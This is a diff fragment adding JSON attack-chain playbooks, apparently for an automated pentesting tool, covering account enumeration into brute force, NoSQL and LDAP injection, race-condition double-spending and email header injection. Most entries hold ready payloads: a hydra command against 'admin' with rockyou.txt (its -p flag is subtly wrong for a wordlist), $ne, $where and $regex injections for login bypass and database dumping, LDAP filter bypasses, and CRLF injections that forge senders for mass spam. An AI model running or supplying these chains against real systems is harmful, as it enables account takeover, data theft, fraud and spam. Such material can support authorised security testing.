+        {
+          "order": 3,
+          "action": "Analyze responses: different length/error for valid credentials",
+          "tool_hint": "manual",
+          "success_criteria": "Valid creds identified",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Login with valid credentials",
+          "tool_hint": "manual",
+          "success_criteria": "Account access confirmed",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": []
+    },
+    {
+      "id": "account_enum_to_brute_force",
+      "name": "Account Enumeration to Targeted Brute Force",
+      "triggers": [
+        "account enumeration",
+        "username discovery",
+        "login",
+        "password reset"
+      ],
+      "required_findings": [
+        "enumeration",
+        "login"
+      ],
+      "severity": "MEDIUM",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Test registration: admin@target.com vs random@target.com",
+          "tool_hint": "manual",
+          "success_criteria": "Different error messages",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Enumerate via password reset: 'user exists' vs 'user not found'",
+          "tool_hint": "turbo_intruder",
+          "success_criteria": "Valid user list built",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Brute force with valid usernames: hydra -l admin -p rockyou.txt",
+          "tool_hint": "hydra",
+          "success_criteria": "Password cracked",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Login with cracked credentials",
+          "tool_hint": "manual",
+          "success_criteria": "Account access confirmed",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": [
+        "hydra",
+        "ffuf"
+      ]
+    },
+    {
+      "id": "nosql_injection_to_data_theft",
+      "name": "NoSQL Injection to Mass Data Theft",
+      "triggers": [
+        "nosql",
+        "mongodb",
+        "json injection",
+        "$where",
+        "$ne"
+      ],
+      "required_findings": [
+        "nosql",
+        "mongodb"
+      ],
+      "severity": "CRITICAL",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Confirm NoSQLi: {\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
+          "tool_hint": "manual",
+          "success_criteria": "Auth bypassed",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Enumerate collections: {\"$where\":\"this.constructor.name=='Collection'\"}",
+          "tool_hint": "manual",
+          "success_criteria": "Collection names obtained",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Dump users: {\"$where\":\"return true\"} with projection {email:1, password:1}",
+          "tool_hint": "manual",
+          "success_criteria": "User data extracted",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Blind extraction: {\"password\":{\"$regex\":\"^a\"}} \u2014 iterate chars",
+          "tool_hint": "nosqlmap",
+          "success_criteria": "Full DB dumped",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": []
+    },
+    {
+      "id": "ldap_injection_to_auth_bypass",
+      "name": "LDAP Injection to Authentication Bypass",
+      "triggers": [
+        "ldap",
+        "active directory",
+        "saml",
+        "adfs",
+        "ou=",
+        "dc="
+      ],
+      "required_findings": [
+        "ldap",
+        "active directory"
+      ],
+      "severity": "CRITICAL",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Confirm LDAPi: admin*)(uid=*))(|(uid=*",
+          "tool_hint": "manual",
+          "success_criteria": "Auth bypassed",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Enumerate users: admin*)(uid=*))(|(uid=*a*) \u2014 check response delta",
+          "tool_hint": "manual",
+          "success_criteria": "User list built",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Extract attributes: *(objectClass=*))(|(objectClass=*)",
+          "tool_hint": "manual",
+          "success_criteria": "mail, memberOf obtained",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Dump full directory via automated script",
+          "tool_hint": "manual",
+          "success_criteria": "AD compromised",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": []
+    },
+    {
+      "id": "race_condition_to_double_spend",
+      "name": "Race Condition to Double-Spend Attack",
+      "triggers": [
+        "race condition",
+        "concurrent",
+        "double-spend",
+        "coupon",
+        "transfer"
+      ],
+      "required_findings": [
+        "race condition",
+        "financial"
+      ],
+      "severity": "CRITICAL",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Identify state-changing endpoint: /transfer, /redeem, /withdraw",
+          "tool_hint": "manual",
+          "success_criteria": "Target endpoint found",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Send 50 concurrent requests with same payload",
+          "tool_hint": "turbo_intruder",
+          "success_criteria": "Multiple applications successful",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Verify impact: balance negative, coupon used 50x",
+          "tool_hint": "manual",
+          "success_criteria": "Financial impact confirmed",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Document PoC: video + request logs",
+          "tool_hint": "manual",
+          "success_criteria": "Reproducible PoC",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": [
+        "ffuf",
+        "curl"
+      ]
+    },
+    {
+      "id": "email_injection_to_spam_relay",
+      "name": "Email Header Injection to Spam Relay",
+      "triggers": [
+        "email",
+        "contact form",
+        "invite",
+        "feedback",
+        "cc:",
+        "bcc:"
+      ],
+      "required_findings": [
+        "email",
+        "contact"
+      ],
+      "severity": "MEDIUM",
+      "steps": [
+        {
+          "order": 1,
+          "action": "Identify email functionality: contact, invite, feedback",
+          "tool_hint": "manual",
+          "success_criteria": "Email form found",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 2,
+          "action": "Inject CC: name%0ACc:victim1@example.com,victim2@example.com",
+          "tool_hint": "manual",
+          "success_criteria": "Emails sent to victims",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 3,
+          "action": "Forge sender: subject=Invoice%0AFrom:billing@target.com",
+          "tool_hint": "manual",
+          "success_criteria": "Email appears from target.com",
+          "invariant_check": "",
+          "negative_control": ""
+        },
+        {
+          "order": 4,
+          "action": "Mass spam: automate injection for bulk sending",
+          "tool_hint": "script",
+          "success_criteria": "Spam relay confirmed",
+          "invariant_check": "",
+          "negative_control": ""
+        }
+      ],
+      "tools": [
+        "curl",
+        "swaks"
+      ]
+    }
+  ]
+}
